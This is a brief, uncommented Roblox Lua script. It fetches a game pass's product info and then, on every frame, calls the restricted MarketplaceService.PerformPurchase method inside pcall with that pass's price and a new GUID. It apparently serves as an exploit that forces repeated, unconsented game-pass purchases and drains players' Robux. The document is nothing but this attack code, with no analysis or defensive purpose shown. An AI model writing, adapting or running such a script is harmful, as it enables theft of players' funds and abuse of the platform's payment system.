gamePassId = 72385
market = game:GetService("MarketplaceService")
http = game:GetService("HttpService")
info = market:GetProductInfo(gamePassId, Enum.InfoType.GamePass)
game:GetService("RunService").Stepped:connect(function()
pcall(market.PerformPurchase, market, Enum.InfoType.Asset, info["ProductId"], info["PriceInRobux"], http:GenerateGUID(false))
end)